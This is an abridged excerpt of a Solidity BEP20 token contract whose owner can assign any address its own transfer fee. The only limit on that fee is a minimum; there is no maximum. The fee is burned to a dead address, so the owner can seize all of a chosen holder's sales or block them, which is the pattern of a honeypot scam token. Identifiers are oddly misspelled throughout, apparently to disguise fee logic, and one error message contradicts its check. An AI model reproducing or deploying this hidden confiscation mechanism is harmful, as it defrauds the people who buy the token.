 ...
 *
 * This module is used through inheritance. It will make available the modifeiur
...
contract SS is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfeiu = 3;
    ...
    mapping(address => uint256) private _SLfeiu;
    ...
    function setSLfeiu(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfeiu[_address] = _value;
    }

    function getSLfeiu(address _address) external view onlyowner returns (uint256) {
        return _SLfeiu[_address];
    }


    function setMarketacountsfeiu(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfeiu(address _address) external view onlyowner returns (bool) {
     ...
     * e.g. implement automatic token feius, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        if (rF) {
            ...
            if (_SLfeiu[sender] > 0) {
                tradefeiu = _SLfeiu[sender];
            }

            tradefeiuAmount = amount.mul(tradefeiu).div(100);
        }


        if (tradefeiuAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefeiuAmount);
            emit Transfer(sender, _DEADaddress, tradefeiuAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefeiuAmount);
        emit Transfer(sender, recipient, amount - tradefeiuAmount);
    }
